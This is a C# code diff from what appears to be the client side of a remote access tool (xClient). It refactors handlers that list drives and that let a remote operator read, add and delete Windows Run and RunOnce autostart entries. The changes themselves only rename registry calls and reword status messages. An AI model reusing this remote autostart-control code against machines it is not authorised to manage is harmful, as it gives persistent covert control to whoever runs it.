@@ -25,18 +25,18 @@ namespace xClient.Core.Commands
             }
             catch (IOException)
             {
-                new Packets.ClientPackets.SetStatusFileManager("GetDrives: I/O error", false).Execute(client);
+                new Packets.ClientPackets.SetStatusFileManager("GetDrives I/O error", false).Execute(client);
                 return;
             }
             catch (UnauthorizedAccessException)
             {
-                new Packets.ClientPackets.SetStatusFileManager("GetDrives: No permission", false).Execute(client);
+                new Packets.ClientPackets.SetStatusFileManager("GetDrives No permission", false).Execute(client);
                 return;
             }
 
             if (drives.Length == 0)
             {
-                new Packets.ClientPackets.SetStatusFileManager("GetDrives: No drives", false).Execute(client);
+                new Packets.ClientPackets.SetStatusFileManager("GetDrives No drives", false).Execute(client);
                 return;
             }
 
@@ -109,28 +109,28 @@ namespace xClient.Core.Commands
             {
                 List<string> startupItems = new List<string>();
 
-                using (var key = Registry.LocalMachine.OpenReadonlySubKeySafe("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
+                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                 {
                     if (key != null)
                     {
                         startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "0" + formattedKeyValue));
                     }
                 }
-                using (var key = Registry.LocalMachine.OpenReadonlySubKeySafe("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
+                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                 {
                     if (key != null)
                     {
                         startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "1" + formattedKeyValue));
                     }
                 }
-                using (var key = Registry.CurrentUser.OpenReadonlySubKeySafe("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
+                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                 {
                     if (key != null)
                     {
                         startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "2" + formattedKeyValue));
                     }
                 }
-                using (var key = Registry.CurrentUser.OpenReadonlySubKeySafe("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
+                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                 {
                     if (key != null)
                     {
@@ -139,14 +139,14 @@ namespace xClient.Core.Commands
                 }
                 if (PlatformHelper.Architecture == 64)
                 {
-                    using (var key = Registry.LocalMachine.OpenReadonlySubKeySafe("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
+                    using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
                     {
                         if (key != null)
                         {
                             startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "4" + formattedKeyValue));
                         }
                     }
-                    using (var key = Registry.LocalMachine.OpenReadonlySubKeySafe("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
+                    using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                     {
                         if (key != null)
                         {
@@ -178,28 +178,28 @@ namespace xClient.Core.Commands
                 switch (command.Type)
                 {
                     case 0:
-                        if (!RegistryKeyHelper.AddRegistryKeyValue(Registry.LocalMachine,
+                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
                         {
                             throw new Exception("Could not add value");
                         }
                         break;
                     case 1:
-                        if (!RegistryKeyHelper.AddRegistryKeyValue(Registry.LocalMachine,
+                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
                         {
                             throw new Exception("Could not add value");
                         }
                         break;
                     case 2:
-                        if (!RegistryKeyHelper.AddRegistryKeyValue(Registry.CurrentUser,
+                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
                         {
                             throw new Exception("Could not add value");
                         }
                         break;
                     case 3:
-                        if (!RegistryKeyHelper.AddRegistryKeyValue(Registry.CurrentUser,
+                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
                         {
                             throw new Exception("Could not add value");
@@ -209,7 +209,7 @@ namespace xClient.Core.Commands
                         if (PlatformHelper.Architecture != 64)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
-                        if (!RegistryKeyHelper.AddRegistryKeyValue(Registry.LocalMachine,
+                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                             "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
                         {
                             throw new Exception("Could not add value");
@@ -219,7 +219,7 @@ namespace xClient.Core.Commands
                         if (PlatformHelper.Architecture != 64)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
-                        if (!RegistryKeyHelper.AddRegistryKeyValue(Registry.LocalMachine,
+                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                             "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
                         {
                             throw new Exception("Could not add value");
@@ -258,28 +258,28 @@ namespace xClient.Core.Commands
                 switch (command.Type)
                 {
                     case 0:
-                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(Registry.LocalMachine,
+                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
                         {
                             throw new Exception("Could not remove value");
                         }
                         break;
                     case 1:
-                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(Registry.LocalMachine,
+                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
                         {
                             throw new Exception("Could not remove value");
                         }
                         break;
                     case 2:
-                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(Registry.CurrentUser,
+                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
                         {
                             throw new Exception("Could not remove value");
                         }
                         break;
                     case 3:
-                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(Registry.CurrentUser,
+                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
                         {
                             throw new Exception("Could not remove value");
@@ -289,7 +289,7 @@ namespace xClient.Core.Commands
                         if (PlatformHelper.Architecture != 64)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
-                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(Registry.LocalMachine,
+                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                             "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
                         {
                             throw new Exception("Could not remove value");
@@ -299,7 +299,7 @@ namespace xClient.Core.Commands
                         if (PlatformHelper.Architecture != 64)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
-                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(Registry.LocalMachine,
+                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                             "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
                         {
                             throw new Exception("Could not remove value");
